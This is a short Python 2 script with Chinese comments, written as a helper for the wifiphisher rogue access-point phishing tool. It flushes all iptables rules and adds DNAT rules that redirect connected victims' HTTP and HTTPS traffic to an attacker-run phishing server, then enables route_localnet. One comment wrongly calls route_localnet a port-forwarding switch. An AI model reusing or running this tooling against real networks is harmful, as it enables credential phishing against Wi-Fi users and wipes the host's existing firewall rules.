# -*- coding: utf-8 -*-
#这个脚本是wifiphisher专用
#需要在DetetAP、StartAP前使用,目的是将用户连接AP后的数据包目的地址转到
#攻击者开启的HTTP或者HTTPS服务端口,从而给用户呈现钓鱼页面
import os
from subprocess import Popen, PIPE
from color import *

def Start(IP='10.0.0.1',PORT=8080,SSL_IP='10.0.0.1',SSL_PORT=443):
    '''
       IP指定你的HTTP服务器绑定的接口IP,不推荐使用127.0.0.1
       SSL_PORT指定的你的HTTPS服务器的接口IP,不推荐使用127.0.0.1
    '''
    # Set iptable rules and kernel variables.
    os.system("iptables -F")
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination '+IP+':%s' % PORT)
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination '+SSL_IP+':%s' % SSL_PORT)
    #应该是开启端口转发
    DN = open(os.devnull, 'w')
    Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)
    # sysctl配置与显示在/proc/sys目录中的内核参数,可以用sysctl来设置或重新设置联网功能,
    #如IP转发、IP碎片去除以及源路由检查等
    #如果仅仅是想临时改变某个系统参数的值，可以用两种方法来实现,例如想启用IP路由转发功能：
    #1)  echo 1 > /proc/sys/net/ipv4/ip_forward
    #2)  sysctl -w net.ipv4.ip_forward=1
    #但如果系统重启，或执行了service network restart  上述设置就会失效
    #如果想永久保留配置，可以修改/etc/sysctl.conf文件,将 net.ipv4.ip_forward=0改为net.ipv4.ip_forward=1
    print '[' + T + '*' + W + ']Set up iptables'

    
if __name__=='__main__':
    Start(IP='192.168.81.183',SSL_IP='192.168.81.183')
